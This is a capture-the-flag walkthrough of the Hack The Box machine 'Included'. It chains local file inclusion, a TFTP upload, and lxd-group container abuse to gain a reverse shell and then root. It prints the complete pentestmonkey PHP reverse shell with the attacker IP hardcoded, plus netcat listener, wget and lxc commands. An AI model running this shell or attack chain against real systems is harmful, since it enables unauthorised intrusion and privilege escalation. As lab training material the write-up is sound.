# Included
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)


Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Kali Linux
* IP Address: 10.10.14.251

Victim:
* Name: victim_machine
* IP Address: 10.129.170.67
* Other information must be gathered during the attack

Phase 1: Enumeration
--
On the attacker_machine:

    $ sudo nmap -sS 10.129.170.67 -vvv
    $ sudo nmap -sU 10.129.170.67 -vvv
    
The most important information is port 80/tcp and port 69/udp (TFTP) opened.

TFTP is the Trivial FTP, a minimal FTP protocol used for basic FTP functions. We can use it to connect to the victim machine.

For first, since port 80/tcp is opened, let's visit the IP address by the browser: http://10.129.170.67.

The URL shows a standard website by from the shown URL on the bar, http://10.129.170.67/?file=home.php, it could be vulnerable to local file inclusion because of `?file=` parameter. For being sure of this, we can try to do some check by searching for Linux or Windows file.

Usually, we can visit the following URL: http://10.129.95.185/?file=../../../etc/passwd or http://10.129.95.185/?file=/etc/passwd.

If we get some results, it means that is actually vulnerable to local file inclusion.

Usually, when we detect this kind of vulnerability, we can try to search valuable information inside some files. Some of them are described here: https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

In our case, we didn't find any valuable information inside these files except for `.htpasswd` that contains the username and the password of one user on the target machine. We will use it later.

Remember also that port 69/udp is opened, so by using TFTP and exploiting local file inclusion we can upload and enable a PHP reverse shell.

Phase 2: Foothold
---
For first, we must create a PHP shell. One example is the following:
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.251';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```
Save it on your machine because we will upload it on the victim machine. Remember that each file we upload on the target machine by TFTP, it will be stored in the `/var/lib/tftpboot/` folder.

By using TFTP:
```
$ tftp
tftp> connect
(to) 10.129.95.185
tftp> status
Connected to 10.129.95.185.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put shell.php
Sent 5680 bytes in 0.7 seconds
tftp> quit
```
We uploaded the shell.php on the target machine. Then, before call the shell, we must using netcat for listening on the port specified in the `shell.php` file:
```
$ nc -lvnp 4444
```
Next, we must call it by using the local file inclusion vulnerability by surfing the following URL on the browser: http://10.129.95.185/?file=/var/lib/tftpboot/shell.php or by using `curl` command:
```
$ curl http://10.129.95.185/?file=/var/lib/tftpboot/shell.php
```
After this, come back to netcat listener, and we can see we accessed on the target machine. We access on the machine as `www-data` user. Before, inside the `.htpasswd` file we found some credential. Try to use it on the shell we just gained by typing:
```
$ python3 -c "import pty;pty.spawn('/bin/bash');"
$ su - mike
```
Insert the password you found in the `.htpasswd` and then you gained the access as `mike` user and you can go to catch the user flag.

Phase 3: Privilege Escalation
--
Now we need to pwn the system by getting the root privilege. How can we do this?

Searching on sensitive files we didn't find any valuable information, and `mike` user cannot access to `/etc/sudoers` file (`sudo -l`) to check if there is some program it can run as root. Let's try to see which group `mike` user belongs by typing:
```
$ groups

mike lxd
```
We can see that `mike` user belongs to `lxd` group. LXD (Linux Daemon) is a concept related to LXC (Linux Container). An user belonging this group can escalate privileges to root. More theorical information is shown in the following link: https://www.hackingarticles.in/lxd-privilege-escalation

In our task, our approach should be the following: download Alpine Linux Container, upload it to the target machine, build the files, execute the set of lxd/lxc commands to escalate privileges. The principle here is to build and run a container in the target machine and mount the target machine itself inside the container. So we should have a hierarchical structure like (target machine -> container -> target machine).

For first, clone the Alpine Linux Container project in our machine by:
```
git clone https://github.com/saghul/lxd-alpine-builder ~/alpine
cd ~/alpine
sudo ./build-alpine
```
At this point you should get a .tar.gz archive (it could be that you get an older file .tar.gz already after the `git clone` but here we work with the newest file version gotten by running `build-alpine` script).

The archive contains all the needed file for setting up the container in the target machine. For this reason, the next step now is to send this archive to the target machine.

For doing this, an idea could be setting a HTTP server on our machine and by `wget` command on the target machine we can download the file directly on the target machine (I think we can also use TFTP by I didn't test it).
Let's run these commands:
```
$ python3 -m http.server 4000
```
The root folder of our HTTP server will be the folder where we started this command above. At this point, on target machine side, we can download the archive by typing the following command:
```
$ wget http://10.10.14.251:4000/alpine-v3.15-x86_64-20211221_1207.tar.gz
```
Then you can import the archive/image by the following command:
```
$ lxc image import ./alpine-v3.15-x86_64-20211221_1207.tar.gz --alias privesc
```
In this way, we imported the image of Alpine Linux image to the image store. For a further check, we can list all imported images as:
```
$ lxc image list

+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+                                                                                                                         
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |                                                                                                                         
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+                                                                                                                         
| privesc | 141bb3017606 | no     | alpine v3.15 (20211221_12:07) | x86_64 | 3.66MB | Dec 21, 2021 at 7:12pm (UTC) |                                                                                                                         
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+  
```
Now we can create a container from the image above, by setting some configuration value to be applied in the new container. The setting value is `security.privileged=true`. After this initialization, it is necessary to mount the victim file system to the container, then start the container and interact with the container by the shell.

Note: `security.privileged=true` value is used for forcing the container to interact as root with the host filesystem otherwise, when we try to access to the mounted file system, on the high privilege folders we get `Permission denied`.

The set of commands to do these steps are:
```
lxc init privesc pvtcontainer -c security.privileged=true
lxc config device add pvtcontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start pvtcontainer
lxc exec pvtcontainer /bin/sh
```
Now we can interact inside the container system, and since we mounted the victim file system on it, we can access on files of target system by:
```
ls /mnt/root/
```
It is the root folder of the victim machine file system. Since you set the `security.privileged=true` flag, you can access and manage also high privileged files. At this point, you can search for the root flag.